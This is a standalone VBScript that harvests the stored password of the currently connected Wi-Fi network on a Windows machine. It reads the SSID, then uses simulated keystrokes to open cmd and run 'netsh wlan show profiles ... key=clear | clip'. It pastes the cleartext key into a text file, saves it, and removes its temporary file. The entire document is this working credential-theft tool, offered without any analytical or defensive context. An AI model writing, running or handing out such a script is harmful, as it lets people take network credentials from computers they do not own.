Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim wifiName
wifiName = GetCurrentWiFiName()

If wifiName = "" Then
    WScript.Echo "No connected Wi-Fi network found."
    WScript.Quit
End If

Dim notepadFileName
notepadFileName = "yourtxtfilename.txt"

Set x = CreateObject("WScript.Shell")

x.SendKeys "^{ESC}"
WScript.Sleep(1000)

x.SendKeys "cmd"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

x.SendKeys "netsh wlan show profiles """ & wifiName & """ key=clear | clip"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

strFilePath = objFSO.BuildPath(strScriptDir, notepadFileName)

If objFSO.FileExists(strFilePath) Then
    objShell.Run "notepad.exe " & strFilePath
Else
    WScript.Echo "File not found: " & strFilePath
End If

WScript.Sleep(2000)

x.SendKeys "^v"
WScript.Sleep(100)

x.SendKeys "^s"
WScript.Sleep(100)

x.SendKeys "%{F4}"
WScript.Sleep(1000)


Function GetCurrentWiFiName()
    Dim outputFile, input, currentSSID
    outputFile = "wifi_status.txt"

    ' Run netsh command to check current Wi-Fi connection and save to a file
    objShell.Run "cmd.exe /c netsh wlan show interfaces > " & outputFile, 0, True

    ' Open and read the file
    If objFSO.FileExists(outputFile) Then
        Set input = objFSO.OpenTextFile(outputFile, 1)
        Do While Not input.AtEndOfStream
            Dim line
            line = input.ReadLine
            If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
                currentSSID = Trim(Split(line, ":")(1))
                Exit Do
            End If
        Loop
        input.Close
        objFSO.DeleteFile outputFile ' Clean up the temporary file
    End If

    GetCurrentWiFiName = currentSSID
End Function
